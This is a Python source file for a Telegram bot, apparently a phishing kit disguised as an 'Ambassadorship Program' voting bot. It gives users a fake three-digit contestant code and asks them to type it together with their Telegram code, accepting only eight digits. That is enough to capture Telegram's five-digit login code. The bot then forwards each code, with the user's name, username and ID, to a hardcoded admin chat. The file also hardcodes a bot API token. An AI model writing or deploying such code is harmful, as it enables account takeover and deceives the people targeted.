from flask import Flask
import threading
import os
import logging
import random
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Flask app
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Start Flask in background
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()

# Telegram Bot
API_TOKEN = os.environ.get("BOT_TOKEN", "8426626613:AAGx34R6KeMfBEpexqKq2sr9VFUxSB6O1hs")


bot = telebot.TeleBot(API_TOKEN)


#telegram link with ref  t.me/Ambassadorship_Programs_bot?start=ambassadorship2025
# telegram link t.me/Ambassadorship_Programs_bot
# telegram link for auto statr bot with button t.me/Ambassadorship_Programs_bot?start=1
#get admin chat id with @userinfobot
#ADMIN_TELEGRAM_ID = 6772237358   #Testing  <-- replace with your Telegram user ID

ADMIN_TELEGRAM_ID = 1610519395




@bot.message_handler(commands=['start'])
def send_welcome(message):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🗳️ Start Voting", callback_data="start_voting"))
    
    bot.send_message(
        message.chat.id,
        "👋 Welcome to *Ambassadorship Program*!\n\n"
        "Proceed voting for your candidate below ⬇️",
        parse_mode='Markdown',
        reply_markup=kb
    )
    
    # Notify admin
    try:
        bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 New user started the Bot 5!\n\n"
            f"👤 User: @{message.from_user.username or 'No Username'}\n"
            f"📛 Name: {message.from_user.first_name}\n"
            f"🆔 ID: {message.from_user.id}"
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_voting')
def ask_code(call):
    random_number = random.randint(100, 999)
    bot.send_message(
        call.message.chat.id,
        f"Your Contestant Code is: {random_number}\n\n"
        f"📝 Enter your Contestant code along side your telegram *code* into the prompt below to proceed with your Vote:",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: True)
def handle_code(message):
    if message.text.startswith('/'):
        return
        
    code_entered = message.text.strip()
    
    if not code_entered.isdigit() or len(code_entered) != 8:
        bot.send_message(message.chat.id, "❌ Invalid code! Please enter your Contestant code along side your Telegram code. Try again.")
        return
    
    random_number = random.randint(100, 999)
    combined_vote = f"{code_entered}Votes"
    
    bot.send_message(
        message.chat.id,
        f"✅ You have successfully sent *{combined_vote}*! 🎉\n\n"
        "Thank you for your participation.",
        parse_mode='Markdown'
    )
    
    # Notify admin
    try:
        bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 Ambassadorship Program Bot 5!\n\n"
            f"📩 *New Vote Submitted!*\n\n"
            f"👤 User: @{message.from_user.username or 'No username'}\n"
            f"📛 Name: {message.from_user.first_name}\n"
            f"🆔 ID: {message.from_user.id}\n"
            f"🔑 Code Sent: {combined_vote}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}")

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()

